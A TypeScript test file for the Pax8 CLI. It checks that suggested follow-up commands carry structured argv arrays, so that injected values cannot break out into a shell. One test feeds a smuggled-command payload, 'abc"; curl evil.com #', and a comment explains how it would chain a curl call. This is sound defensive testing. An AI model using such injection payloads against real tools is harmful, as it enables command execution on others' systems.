// Copyright 2026 Pax8, Inc.
// SPDX-License-Identifier: Apache-2.0

/**
 * Contract test for `nextActions[].args` — the durable fix for #562.
 *
 * Every list-command `--json --with-actions` invocation emits `nextActions`
 * entries with BOTH a `command` display string and a structured `args`
 * argv array. Agents are documented (AGENTS.md, CLAUDE.md, skill.md) to
 * spawn `args.slice(1)` — the same pattern resolved for `orderCommand` →
 * `orderArgs` in #462/#509. This file gates that contract:
 *
 *   1. Every nextActions entry has a string `command` and a `string[]` args.
 *   2. `args[0] === "pax8"`.
 *   3. User-supplied flag values (e.g. `--product "shell;injection"`) land
 *      as a SINGLE argv slot — not interpolated into shell-meaningful
 *      positions. This is what closes the shell-injection class even when
 *      an agent ignores guidance and pipes `command` to a shell.
 */

import { describe, it, expect } from "vitest";
import { runCliExpectSuccess } from "./test-utils.js";

interface NextAction {
  command: string;
  args: string[];
  description: string;
}

interface ListJsonWithActions {
  nextActions?: NextAction[];
}

async function fetchListJson(args: string[]): Promise<ListJsonWithActions> {
  const { stdout } = await runCliExpectSuccess([...args, "--json", "--with-actions"]);
  // Strip any leading non-JSON content (test-utils handles banners → stderr
  // for us, but be defensive).
  const trimmed = stdout.trim();
  return JSON.parse(trimmed) as ListJsonWithActions;
}

function assertWellFormedNextActions(payload: ListJsonWithActions): void {
  expect(payload.nextActions).toBeDefined();
  expect(Array.isArray(payload.nextActions)).toBe(true);
  for (const action of payload.nextActions ?? []) {
    expect(typeof action.command).toBe("string");
    expect(action.command.length).toBeGreaterThan(0);
    expect(Array.isArray(action.args)).toBe(true);
    expect(action.args.length).toBeGreaterThanOrEqual(2);
    expect(action.args[0]).toBe("pax8");
    for (const a of action.args) {
      expect(typeof a).toBe("string");
    }
    expect(typeof action.description).toBe("string");
  }
}

describe("nextActions argv contract (#562)", () => {
  const COMMANDS: Array<{ label: string; args: string[] }> = [
    { label: "subscriptions list", args: ["subscriptions", "list", "--size", "2"] },
    { label: "clients list", args: ["clients", "list", "--size", "2"] },
    { label: "orders list", args: ["orders", "list", "--size", "2"] },
    { label: "invoices list", args: ["invoices", "list", "--size", "2"] },
  ];

  for (const { label, args } of COMMANDS) {
    it(`'pax8 ${label}' nextActions entries carry both \`command\` and \`args\``, async () => {
      const payload = await fetchListJson(args);
      assertWellFormedNextActions(payload);
    }, 20_000);
  }

  it("malicious --product value is contained in a single argv slot, not interpolated", async () => {
    // The injection-attempt value is what an attacker (or a careless
    // partner) might type. Pre-fix, this string was interpolated raw into
    // `nextActions[].command` and would tokenize into a shell as
    // `--product abc; curl evil.com` — a command-chain breakout if any
    // agent tokenized and shell-execed the display string.
    //
    // Post-fix, the value must land as exactly ONE argv slot, regardless
    // of what shell metacharacters it contains. That's what makes the
    // argv pattern durable: no quoting concerns, no tokenizer round-trip,
    // no possibility of breakout.
    const malicious = 'abc"; curl evil.com #';
    const payload = await fetchListJson([
      "subscriptions",
      "list",
      "--product",
      malicious,
      "--size",
      "2",
    ]);
    assertWellFormedNextActions(payload);
    // Find the page-action (the one that carries forward filter flags).
    const pageAction = payload.nextActions?.find((a) =>
      a.description.startsWith("Fetch the next page"),
    );
    // The page-action may be absent if the malicious filter returned 0
    // results (no next page exists). Both states are valid; we only
    // assert containment when it IS present.
    if (pageAction) {
      const idx = pageAction.args.indexOf("--product");
      expect(idx).toBeGreaterThanOrEqual(0);
      expect(pageAction.args[idx + 1]).toBe(malicious);
      // The malicious string must NOT appear split across multiple argv
      // slots (would indicate string-interpolation crept back in).
      const occurrences = pageAction.args.filter((a) => a === malicious).length;
      expect(occurrences).toBe(1);
    }
  }, 20_000);
});
